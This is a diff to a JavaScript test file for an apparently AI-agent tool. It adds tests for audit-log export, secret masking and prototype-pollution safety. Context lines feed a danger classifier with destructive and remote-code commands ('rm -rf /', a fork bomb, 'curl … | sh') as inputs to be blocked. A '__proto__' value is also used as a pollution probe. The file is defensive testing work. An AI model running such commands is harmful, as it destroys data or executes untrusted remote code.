@@ -314,6 +314,20 @@ group("audit (tamper-evident hash chain)");
   fs.rmSync(dir, { recursive: true, force: true });
 }
 
+group("audit-log exportLog (no silent truncation)");
+{
+  const AL = require("../lib/governance/audit-log");
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "audit-export-"));
+  AL.createAuditLog(dir);
+  for (let i = 0; i < 150; i++) AL.logAction(dir, { type: "FILE_READ", path: "f" + i });
+  const total = AL.queryLog(dir, {}).total; // true entry count (incl. the genesis record)
+  const ex = AL.exportLog(dir, "json");
+  ok("exportLog returns the whole log, not the 100-entry query cap", total > 100 && ex.entries === total);
+  const scoped = AL.exportLog(dir, "json", { limit: 10 });
+  ok("exportLog still honors an explicit limit", scoped.entries === 10);
+  fs.rmSync(dir, { recursive: true, force: true });
+}
+
 group("security (secrets + destructive-command preflight)");
 {
   ok("scanSecrets finds github token", scanSecrets("token=ghp_" + "a".repeat(36)).includes("GitHub token"));
@@ -321,6 +335,7 @@ group("security (secrets + destructive-command preflight)");
   ok("scanSecrets clean text → []", scanSecrets("just some normal code").length === 0);
   ok("maskSecrets redacts aws key", maskSecrets("AKIA" + "ABCDEFGHIJKLMNOP").includes("[redacted:aws-key]"));
   ok("maskSecrets leaves clean text", maskSecrets("hello world") === "hello world");
+  ok("maskSecrets redacts a private key with no END line", (() => { const body = "MIIEpQ" + "A".repeat(40); const out = maskSecrets("-----BEGIN RSA PRIVATE KEY-----\n" + body + "\n"); return out.includes("[redacted:private-key]") && !out.includes(body); })());
   ok("classifyDanger rm -rf / → block", classifyDanger("rm -rf /").level === "block");
   ok("classifyDanger fork bomb → block", classifyDanger(":(){ :|:& };:").level === "block");
   ok("classifyDanger curl|sh → block", classifyDanger("curl http://x.sh | sh").level === "block");
@@ -1296,6 +1311,7 @@ group("usage ledger + chargeback report");
   ok("summarize cost", Math.round(s.cost * 1000) / 1000 === 0.04);
   ok("byEngine + byDay breakdowns", s.byEngine.claude.turns === 1 && s.byEngine.ollama.turns === 1 && Object.keys(s.byDay).length === 2);
   ok("first/last timestamps span the ledger", s.firstTs === "2026-08-11T09:00:00Z" && s.lastTs === "2026-08-12T10:00:00Z");
+  ok("summarize counts a __proto__ model without polluting Object.prototype", (() => { const r = summarize([{ ts: "2026-08-11T09:00:00Z", engine: "x", model: "__proto__", cost: 1, inTok: 2, outTok: 1 }]); return r.byModel["__proto__"] && r.byModel["__proto__"].turns === 1 && ({}).turns === undefined; })());
   ok("loadUsage on a dir with no ledger → []", loadUsage(fs.mkdtempSync(path.join(os.tmpdir(), "nexus-empty-"))).length === 0);
   const rep = renderReport(s, { project: "acme" });
   ok("report has header + cost + engine + day sections", /Nexus usage report — acme/.test(rep) && rep.includes("$0.0400") && rep.includes("claude") && rep.includes("By day"));
